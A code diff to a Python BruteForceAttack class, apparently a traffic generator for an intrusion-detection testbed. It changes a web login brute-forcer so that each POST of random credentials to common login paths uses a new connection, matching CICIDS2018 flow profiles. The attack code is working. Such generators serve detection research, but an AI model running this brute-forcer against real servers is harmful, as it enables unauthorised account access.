@@ -273,13 +273,19 @@ class BruteForceAttack:
     #   Matches "Brute Force -Web" and "Brute Force -XSS"
     #   classes in CICIDS2018.
     #
-    #   CICFlowMeter signature:  Dst Port = 80, moderate
-    #   packet count, HTTP POST with form data.
+    #   Training data profile:
+    #     Fwd Seg Size Min: 20
+    #     Init Fwd Win Byts: median=8192
+    #     Tot Fwd Pkts: median=4 (Web), median=4 (XSS)
+    #     Dst Port: 80
+    #
+    #   CRITICAL: Training shows short flows (~4 fwd pkts).
+    #   Each login attempt must be a NEW connection.
     # ──────────────────────────────────────────────────────
     def web_brute_force(self):
         """Web login brute force: POST credentials to common login paths.
-        Each attempt sends a full HTTP POST with form-encoded credentials,
-        reads the response, then tries again on the same keep-alive connection."""
+        Each attempt is a NEW TCP connection with 1 POST request,
+        matching the training data profile of ~4 fwd pkts per flow."""
         end_time = time.time() + self.duration
         login_paths = ["/login", "/admin", "/wp-login.php", "/user/login",
                        "/auth/login", "/account/login", "/signin"]
@@ -292,43 +298,37 @@ class BruteForceAttack:
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BRUTE)
                 sock.connect((self.target_ip, 80))
 
-                # Multiple login attempts per connection
-                attempts_per_conn = random.randint(10, 30)
-                for _ in range(attempts_per_conn):
-                    if not self.running or time.time() >= end_time:
-                        break
+                # Send 1 login attempt per connection (matching training ~4 fwd pkts)
+                username = random.choice(USERNAMES)
+                password = random.choice(PASSWORDS)
+                path = random.choice(login_paths)
 
-                    username = random.choice(USERNAMES)
-                    password = random.choice(PASSWORDS)
-                    path = random.choice(login_paths)
+                body = f"username={username}&password={password}&submit=Login"
+                req = (
+                    f"POST {path} HTTP/1.1\r\n"
+                    f"Host: {self.target_ip}\r\n"
+                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                    f"Content-Type: application/x-www-form-urlencoded\r\n"
+                    f"Content-Length: {len(body)}\r\n"
+                    f"Connection: close\r\n"
+                    f"\r\n"
+                    f"{body}"
+                )
+                sock.sendall(req.encode())
+                self._inc_count()
 
-                    body = f"username={username}&password={password}&submit=Login"
-                    req = (
-                        f"POST {path} HTTP/1.1\r\n"
-                        f"Host: {self.target_ip}\r\n"
-                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                        f"Content-Type: application/x-www-form-urlencoded\r\n"
-                        f"Content-Length: {len(body)}\r\n"
-                        f"Connection: keep-alive\r\n"
-                        f"\r\n"
-                        f"{body}"
-                    )
-                    sock.sendall(req.encode())
-                    self._inc_count()
-
-                    # Read response
-                    try:
-                        sock.settimeout(1)
-                        sock.recv(4096)
-                    except socket.timeout:
-                        pass
-                    sock.settimeout(10)
-
-                    time.sleep(random.uniform(0.1, 0.5))
+                # Read response
+                try:
+                    sock.settimeout(1)
+                    sock.recv(4096)
+                except socket.timeout:
+                    pass
 
                 sock.close()
             except Exception:
                 pass
+
+            time.sleep(random.uniform(0.1, 0.5))
 
     def run_attack(self, num_threads=4):
         """Run brute force attack with multiple threads."""
